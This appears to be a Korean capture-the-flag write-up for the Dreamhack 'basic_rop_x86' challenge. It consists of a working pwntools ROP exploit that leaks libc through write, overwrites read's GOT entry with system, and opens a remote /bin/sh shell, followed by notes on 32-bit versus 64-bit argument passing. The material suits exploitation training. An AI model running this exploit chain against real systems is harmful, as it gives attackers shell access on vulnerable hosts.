# basic_rop_x86

```python
#!/usr/bin/python3
from pwn import *

def slog(msg,addr): return success(": ".join([msg,hex(addr)]))

#p = process("./basic_rop_x86")
p = remote("host1.dreamhack.games",13114)
e = ELF("./basic_rop_x86") #코드영역은 변화없음
#libc = ELF("/usr/lib32/libc-2.31.so")
libc = ELF("./libc.so.6")

#context.log_level = 'debug'
#context.terminal = ['/mnt/c/tools/wsl-terminal/open-wsl.exe','-e']
#gdb.attach(p,"b * main+73")

#0x8048688 = pop ebx; pop esi ; pop edi ; pop ebp ; ret
pppr = 0x08048689 #pop esi ; pop edi ; pop ebp ; ret

write_plt = e.plt["write"]
read_plt = e.plt["read"]
read_got = e.got["read"]
bss = e.bss()
binsh = b'/bin/sh\x00'


payload = b"A"*0x48 #buf <-> sfp 

#write(1,read_got,4)
payload += p32(write_plt)
payload += p32(pppr) #값을 빼내는 용도
payload += p32(0x1) #stdin
payload += p32(read_got)
payload += p32(0x4)

#read(0,bss,len(binsh))
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0x0)
payload += p32(bss)
payload += p32(len(binsh))


# [3] GOT overwrite read_got -> system
#read(0,read_got,len(read_got))
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0x0)
payload += p32(read_got)
payload += p32(0x4)

#system("/bin/sh")
payload += p32(read_plt)
payload += b"B"*0x4
payload += p32(bss)

p.send(payload)
p.recvuntil(b"A"*0x40)
read_addr = u32(p.recv(4))
libc_base = read_addr - libc.symbols['read']
system = libc_base + libc.symbols['system']

slog('read',read_addr)
slog('libc_base',libc_base)
slog('system',system)

p.send(binsh)
p.send(p32(system))

p.interactive()

```

32bit 함수 프롤로그는 64bit랑 다르다!

32bit는 먼저 스택에 값을 넣고 난 후에 실행하는 반면 64bit는 레지스터에 값을 넣은 후 함수를 실행한다.

*따라서 32bit는 위에처럼 function_plt를 먼저 넣으면 해당 function에서 해당 function+0x8에서 인자를 가져와서 쓴다. 중간에 있는 gadget pppr은 단순히 인자를 빼주고 ret부분에 다음 함수 function_plt(2)를 위치시켜 해당 함수를 실행하기 위함이다.*  

*따라서 pppr은 인자를 빼내고 다음함수를 실행하는 용도로 사용하기 위해 정확히 pop pop pop ret 이 되어야한다.*

64bit에서는 rdi rsi rdx 값을 잘맞춰줘야 하기때문에 가젯을 잘 찾아야한다.

아니면 oneshot 가젯을 이용하는 것도 방법이다.
